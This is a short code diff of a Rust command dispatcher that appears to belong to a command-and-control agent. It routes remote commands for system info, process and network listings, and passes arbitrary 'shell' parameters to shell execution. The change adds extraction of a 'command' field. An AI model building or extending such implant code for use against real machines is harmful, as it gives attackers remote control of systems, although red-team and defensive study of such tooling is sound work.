@@ -86,8 +86,14 @@ fn dispatch(command: &str, parameters: &str) -> String {
         "info" => collect_system_info(),
         "ps" => shell_exec("ps aux"),
         "netstat" => shell_exec("netstat -an"),
-        "shell" => shell_exec(parameters),
-        _ => shell_exec(parameters),
+        "shell" => {
+            let cmd = link_common::extract_param(parameters, "command");
+            shell_exec(if cmd.is_empty() { parameters } else { &cmd })
+        }
+        _ => {
+            let cmd = link_common::extract_param(parameters, "command");
+            shell_exec(if cmd.is_empty() { parameters } else { &cmd })
+        }
     }
 }
 
